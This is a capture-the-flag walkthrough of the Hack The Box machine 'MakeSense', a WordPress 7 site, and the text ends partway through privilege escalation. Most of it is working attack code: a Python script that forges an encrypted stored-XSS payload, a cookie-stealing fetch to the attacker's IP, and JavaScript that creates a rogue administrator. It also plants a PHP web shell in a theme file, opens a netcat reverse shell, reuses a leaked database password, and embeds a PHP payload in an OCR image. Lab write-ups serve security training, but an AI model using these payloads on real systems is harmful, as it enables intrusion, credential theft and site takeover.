# MakeSense

<figure><img src=".gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>

<mark style="color:blue;">**Step 1**</mark>

**Let's start off with a quick nmap scan.**

{% code overflow="wrap" %}
```bash
ip=10.129.30.216

## TCP Scan
nmap -p- --min-rate 10000 -n -Pn -oA nmap/makesense_tcp.htb $ip
# 22/tcp  open  ssh
# 443/tcp open  https




# Deeper tcp scan
nmap -sC -sV -A -p53,2222,2121,80,8080,3000,5000,9000,8000 -oA nmap/makesense_tcp $ip

# UDP scan
nmap -sU --min-rate 10000 -n -Pn -oA nmap/makesense_udp.htb $ip
```
{% endcode %}

<mark style="color:blue;">**Step 2**</mark>

**Let's modify the hosts and discover the website .**

{% code overflow="wrap" %}
```bash
echo "$ip makesense.htb" | tee -a /etc/hosts
```
{% endcode %}

<figure><img src=".gitbook/assets/image (54).png" alt=""><figcaption></figcaption></figure>

**A wordpress app programming in PHP with mySQL in database**

&#x20;<mark style="color:blue;">**Step 3**</mark>

{% code overflow="wrap" %}
```bash
feroxbuster --url https://$target/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 --insecure --no-recursion

# 400      GET        1l        1w        1c https://makesense.htb/wp-admin/admin-ajax.php

```
{% endcode %}

**While enumring the CMS**

**we found an exposed directorie**

[**https://makesense.htb/wp-content/uploads/**](https://makesense.htb/wp-content/uploads/)

<figure><img src=".gitbook/assets/image (55).png" alt=""><figcaption></figcaption></figure>

[**https://makesense.htb/scripts/**](https://makesense.htb/scripts/)

**and also the XMLRPC endpoint thta can lead us to information disclore or DDOS**&#x20;

{% code overflow="wrap" %}
```bash
curl -sk -X POST https://$target/xmlrpc.php
└─# curl -sk -X POST https://$target/xmlrpc.php                                                                          
<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <fault>
    <value>
      <struct>
        <member>
          <name>faultCode</name>
          <value><int>-32700</int></value>
        </member>
        <member>
          <name>faultString</name>
          <value><string>parse error. not well formed</string></value>
        </member>
      </struct>
    </value>
  </fault>
</methodResponse>
```
{% endcode %}

**The admin endpoint**

[**https://makesense.htb/wp-admin/**<br>](https://makesense.htb/wp-admin/)

<figure><img src=".gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>

&#x20;<mark style="color:blue;">**Step 4**</mark>

**the transformers  ai-models  looks interesting**&#x20;

{% code overflow="wrap" %}
```bash
curl -sk https://makesense.htb/wp-content/ai-models/transformers/transformers.js > transformers.js
```
{% endcode %}

**the ai suggest to do a hard fuzzing on the ai-models that exist**

{% code overflow="wrap" %}
```bash
feroxbuster -u https://makesense.htb/wp-content/ai-models/ -k -x onnx,json,bin,txt,php --scan-dir-listings

https://makesense.htb/wp-content/ai-models/models/whisper-tiny.en/  # 301
https://makesense.htb/wp-content/ai-models/models/distilbart-cnn-12-6/special_tokens_map.json # 200
https://makesense.htb/wp-content/ai-models/models/distilbart-cnn-12-6/generation_config.json # 200
https://makesense.htb/wp-content/ai-models/models/distilbart-cnn-12-6/config.json # 200

https://makesense.htb/wp-content/ai-models/models/distilbart-cnn-12-6/tokenizer_config.json # 200
https://makesense.htb/wp-content/ai-models/models/distilbart-cnn-12-6/onnx/decoder_model_merged_quantized.onnx  # 200

https://makesense.htb/wp-content/ai-models/models/distilbart-cnn-12-6/onnx/encoder_model_quantized.onnx
# 200
```
{% endcode %}

&#x20;**i analyze this files but i cant find anything interesting, we know tha WP-7 lets confirm it**&#x20;

{% code overflow="wrap" %}
```bash
curl -k https://$target/wp-links-opml.php | grep "WordPress"
# <!-- generator="WordPress/7.0" -->
```
{% endcode %}

<figure><img src=".gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
https://makesense.htb//.gitignore it give some informations
```
{% endcode %}

**after emunring all this and go on a rabbit hole  idsocver when i do an ai call and i register a request by audio it saved on the exposed uploaded directory**&#x20;

<figure><img src=".gitbook/assets/image (59).png" alt=""><figcaption></figcaption></figure>

**so the main idea is webshell**

**it doesnt work so i switch to enumrate deeply**

{% code overflow="wrap" %}
```bash
curl -sk https://makesense.htb/ |  grep themes

# var webagency_ajax = {"ajax_url":"https://makesense.htb/wp-admin/admin-ajax.php","nonce":"f3142630f4","theme_url":"https://makesense.htb/wp-content/themes/webagency","site_url":"https://makesense.htb"};

feroxbuster -u https://makesense.htb/wp-content/themes/webagency/ -k -x onnx,json,bin,txt,php --scan-dir-listings

# 301      GET        9l       28w      345c https://makesense.htb/wp-content/themes/webagency/assets => https://makesense.htb/wp-content/themes/webagency/assets/
```
{% endcode %}

<figure><img src=".gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>

[https://makesense.htb/wp-content/themes/webagency/assets/js/main.js](https://makesense.htb/wp-content/themes/webagency/assets/js/main.js)

on the  [https://makesense.htb/wp-content/themes/webagency/assets/js/whisper/whisper-wrapper.js](https://makesense.htb/wp-content/themes/webagency/assets/js/whisper/whisper-wrapper.js)

i found the key that encrypt data&#x20;

{% code overflow="wrap" %}
```javascript
// Symmetric encryption key (must match server-side)
const ENCRYPTION_KEY = 'bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI';

// Encrypt payload using AES-GCM
```
{% endcode %}

**Voice-to-Symbol Mapping (XSS Injection Vector)**

{% code overflow="wrap" %}
```javascript
applySymbolMapping(text) {
    // ...
    const mappings = {
        'open bracket': '<',
        'close bracket': '>',
        'bracket': '<', // Default single 'bracket' to opening
        'slash': '/',
        'back slash': '\\',
        'quote': "'",
        'double quote': '"',
        'open parenthesis': '(',
        'close parenthesis': ')',
        // ...
    };
    // ...
    // Clean up spaces around symbols
    result = result.replace(/\s*([<>\/()[\]{}.,:;=\-_+*&%$#!?])\s*/g, '$1');
    return result;
}
```
{% endcode %}

**Client-Side Trust & Lack of Output Encoding**

{% code overflow="wrap" %}
```javascript
// Combine IV + ciphertext (tag is appended automatically by WebCrypto)
const combined = new Uint8Array(iv.length + encrypted.byteLength);
combined.set(iv, 0);
combined.set(new Uint8Array(encrypted), iv.length);
// ...
return btoa(binary);
```
{% endcode %}

**The system relies on the frontend to encrypt the data, assuming that the server will decrypt it and trust its contents.**&#x48;**owever, because the key is public (Vulnerability #1), an attacker can forge any payload. If the server decrypts this data and renders it in the admin dashboard or frontend without proper HTML entity encoding (e.g., using `innerHTML` instead of `textContent`), the injected `<script>` tags will execute, leading to Stored XSS.**

**i start by encoding my payload using a script**

{% code overflow="wrap" %}
```python
import hashlib
import os
import base64
import json
from Crypto.Cipher import AES

# 1. Extracted from frontend code
ENCRYPTION_KEY = 'bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI'

# 2. The XSS payload (simulating the final output of applySymbolMapping)
# You can change this to any payload you want (e.g., stealing cookies, redirecting, etc.)
xss_payload = "<script>fetch('http://10.10.14.63:1234/?c='+document.cookie)</script>"

payload_data = {
    "transcription": xss_payload,
    "summary": xss_payload
}

# 3. Derive key using SHA-256 (matching WebCrypto API: crypto.subtle.digest('SHA-256', ...))
key_material = hashlib.sha256(ENCRYPTION_KEY.encode('utf-8')).digest()

# 4. Generate random IV (12 bytes for AES-GCM)
iv = os.urandom(12)

# 5. Encrypt using AES-GCM
cipher = AES.new(key_material, AES.MODE_GCM, nonce=iv)
ciphertext, tag = cipher.encrypt_and_digest(json.dumps(payload_data).encode('utf-8'))

# 6. Combine IV + ciphertext + tag (matching frontend logic)
combined = iv + ciphertext + tag

# 7. Base64 encode (matching frontend logic: btoa(binary))
encrypted_payload = base64.b64encode(combined).decode('utf-8')

print("[+] Successfully generated encrypted payload:\n")
print(encrypted_payload)
```
{% endcode %}

**i copy the output and past it on the request**&#x20;

<figure><img src=".gitbook/assets/image (61).png" alt=""><figcaption></figcaption></figure>

**i triggered by sending another time the message**&#x20;

{% code overflow="wrap" %}
```bash
serv 1234
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.129.31.75 - - [07/Jul/2026 08:34:28] "GET /?c=wp-settings-time-3=1783427669 HTTP/1.1" 200 -
10.129.31.75 - - [07/Jul/2026 08:34:28] "GET /?c=wp-settings-time-3=1783427669 HTTP/1.1" 200 -
```
{% endcode %}

**So now the idea is to create an admin user account**

**so i create a payload and using java manifesting**&#x20;

{% code overflow="wrap" %}
```javascript
// payload.js
fetch('/wp-admin/user-new.php', {credentials: 'include'})
  .then(r => r.text())
  .then(html => {
    const match = html.match(/id="_wpnonce_create-user"[^>]*value="([^"]+)"/);
    if (match) {
      const nonce = match[1];
      const data = new URLSearchParams({
        'action': 'createuser',
        '_wpnonce_create-user': nonce,
        '_wp_http_referer': '/wp-admin/user-new.php',
        'user_login': 'hacker',
        'email': 'hacker@test.com',
        'pass1': 'Password123!',
        'pass2': 'Password123!',
        'role': 'administrator',
        'createuser': 'Add New User'
      });
      fetch('/wp-admin/user-new.php', {
        method: 'POST',
        credentials: 'include',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: data.toString()
      });
    }
  });
```
{% endcode %}

**then using the script we encode it and this what we encode exactly**

<figure><img src=".gitbook/assets/image (63).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
python3 encode.py
VqjzdnC78e2ykaa2N5onGMqZ1z0xnGh9o4ZLluKaCimQvefGzSRjt0wObGHW5WD/jT1tyG0/xgKTOjtFppRNrHqXpI+whF8Hkzb9FBrobx2FEE/iCkofJO7YpZVVoFSHM2f06Axf5Ueyzi+tduVxOkmWUP4vWFjCfw6hOxu5QDHuOyu8y+EF0LzzVrh5T/XUj7j9GNmFG2rxqHWNNw3bJBaXxqZmdzse9dE65ZnIQm3kNtBmzgw7NPX9
```
{% endcode %}

**so i send a new message and on the message the paylod not encoded and on burp we receive the encoded paylaod and the clear message i change the encoded payload by this and i resent the clear paylaod and i opne my server web on 2222 to see if admin visit it**&#x20;

{% code overflow="wrap" %}
```bash
serv 2222
Serving HTTP on 0.0.0.0 port 2222 (http://0.0.0.0:2222/) ...
10.129.31.75 - - [07/Jul/2026 09:05:29] "GET /payload1.js HTTP/1.1" 200 -
```
{% endcode %}

<figure><img src=".gitbook/assets/image (62).png" alt=""><figcaption></figcaption></figure>

&#x20;<mark style="color:blue;">**Step 5**</mark>

**Now let's take reverse shell  the most probably on WP we take it from a plugins,themes or something like that let's search on dahsboard what plugins are isntalled and if they're are vulnerable**&#x20;

**The active themes is webagency,we update the funtions.php template**

{% code overflow="wrap" %}
```
if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }
```
{% endcode %}

<figure><img src=".gitbook/assets/Capture d&#x27;écran 2026-07-07 143739.png" alt=""><figcaption></figcaption></figure>

**we save it then we visit the URL**

[https://makesense.htb/wp-content/themes/webagency/functions.php?cmd=id](https://makesense.htb/wp-content/themes/webagency/functions.php?cmd=id)

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Now we take a rev shell**

{% code overflow="wrap" %}
```bash
curl 'https://makesense.htb/wp-content/themes/webagency/functions.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.10.14.45%209001%20%3E%2Ftmp%2Ff' \
    -b 'wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_666f3cbf9610031df176da93aa83bc38=hacker%7C1783602356%7CGidfE0PiHseeTkHE6ndVtEGwaMjAiML730TVlAMixG4%7C88be019c1bc5ce1eae9f0df21bd2bf1a385e6840380c737fb6cdb5
89c7cb8440; wp_lang=en_US; wp-settings-time-6=1783431474' --insecure


listener 9001
www-data@makesense:/var/www/html/wp-content/themes/webagency$
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```
{% endcode %}

<mark style="color:blue;">**Step 6**</mark>

**Let's pivot to walter**

{% code overflow="wrap" %}
```bash
cat wp-config.php
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'walter' );
define( 'DB_PASSWORD', 'JbhHDAEgXvri3!' );
define( 'DB_HOST', 'localhost' );
define( 'DB_CHARSET', 'utf8' );
define( 'DB_COLLATE', '' );
```
{% endcode %}

{% code overflow="wrap" %}
```bash
su - walter
walter@makesense:~$
```
{% endcode %}

<mark style="color:blue;">**Step 7**</mark>

**let's elevate our privs**

{% code overflow="wrap" %}
```bash
ps aux | grep "root"
root        1375  0.0  0.0   2800  1816 ?        Ss   10:59   0:00 /bin/sh -c /root/.scripts/start_ocr4.sh
root        1376  0.0  0.0   7340  3588 ?        S    10:59   0:07 /bin/bash /root/.scripts/start_ocr4.sh
root        1400  0.0  0.7 228488 30536 ?        S    10:59   0:01 php -S 127.0.0.1:8001 -t /root/ocr4/
```
{% endcode %}

**First thing lets forward to this port**&#x20;

<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

**Logging using walter creds**

**After disconvering the site we draw a canvas then it reconized then saved on burp we have two rewqeust one for canvas to dataURL it give our draw in format then we receive a hidden OCR\_id on the response with this OCR\_id we dave an image on /saved/sohaib.txt**

**the problem the sanitization input we can save a php file and we can write a pyalod in image/png format with converting to Data URL and save it using the OCR\_ID**

**i use this script that convert my payload**

{% code overflow="wrap" %}
```py
from PIL import Image, ImageDraw, ImageFont
import base64
import urllib.parse

# Payload plus simple pour Tesseract
payload = "<?php system('id'); ?>"

# Image plus grande avec plus de contraste
img = Image.new('RGB', (1000, 300), color='white')
d = ImageDraw.Draw(img)

# Utiliser une grande police monospace
try:
    font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSansMono-Bold.ttf", 40)
except:
    try:
        font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 40)
    except:
        font = ImageFont.load_default()

# Dessiner le texte avec plus d'espace
d.text((50, 100), payload, fill='black', font=font)
img.save('/tmp/payload_clean.png')

# Convertir en base64
with open('/tmp/payload_clean.png', 'rb') as f:
    b64 = base64.b64encode(f.read()).decode()

# Créer le data URL
data_url = f"data:image/png;base64,{b64}"

# URL encoder
encoded = urllib.parse.quote(data_url)

print(encoded)
```
{% endcode %}

<figure><img src=".gitbook/assets/image (64).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (65).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (66).png" alt=""><figcaption></figcaption></figure>
